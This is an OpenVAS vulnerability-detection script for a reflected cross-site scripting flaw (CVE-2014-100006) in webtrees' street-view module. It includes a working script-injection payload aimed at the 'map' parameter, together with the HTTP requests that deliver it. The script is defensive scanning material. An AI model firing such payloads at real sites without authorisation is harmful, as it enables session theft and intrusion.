###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_webtrees_googlemap_street_view_xss_vuln.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# Webtrees wt_v3_street_view.php Cross-site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805140");
  script_version("$Revision: 13659 $");
  script_cve_id("CVE-2014-100006");
  script_bugtraq_id(65517);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2015-02-18 15:28:52 +0530 (Wed, 18 Feb 2015)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("Webtrees wt_v3_street_view.php Cross-site Scripting Vulnerability");

  script_tag(name:"summary", value:"This host is installed with Webtrees and
  is prone to xss vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Flaw is due to the modules_v3/googlemap/
  wt_v3_street_view.php script does not validate input to the 'map' parameter
  before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker
  to execute arbitrary HTML and script code in the context of an affected site.");

  script_tag(name:"affected", value:"webtrees version before 1.5.2");

  script_tag(name:"solution", value:"Update to version 1.5.2 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/91133");
  script_xref(name:"URL", value:"http://www.rusty-ice.de/advisory/advisory_2014001.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_xref(name:"URL", value:"http://www.webtrees.net/index.php/en");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

http_port = get_http_port(default:80);

if(!can_host_php(port:http_port)){
  exit(0);
}

host = http_host_name(port:http_port);

foreach dir (make_list_unique("/", "/webtrees", cgi_dirs(port:http_port)))
{

  if( dir == "/" ) dir = "";

  sndReq = http_get(item:string(dir, "/index.php"),  port:http_port);
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  if("WT_SESSION" >< rcvRes)
  {
    cookie = eregmatch(pattern:"Set-Cookie: WT_SESSION=([0-9a-z]*);", string:rcvRes);
    if(!cookie[1]){
      exit(0);
    }
  }

  ## Send the request with session id to confirm App
  useragent = http_get_user_agent();
  url = dir + "/login.php?url=index.php%3F";
  sndReq = string('GET ', url,' HTTP/1.1\r\n',
                  'Host: ', host,'\r\n',
                  'User-Agent: ', useragent, 'r\n',
                  'Cookie: WT_SESSION=', cookie[1], '\r\n\r\n');
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  if("webtrees" >< rcvRes && ">Login<" >< rcvRes)
  {
    url = dir + '/modules_v3/googlemap/wt_v3_street_view.php?map='
              + '"><script>alert(document.cookie)</script> ; b="';

    if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
       pattern:"<script>alert\(document\.cookie\)</script>",
       extra_check:"toggleStreetView"))
    {
      security_message(port:http_port);
      exit(0);
    }
  }
}

exit(99);
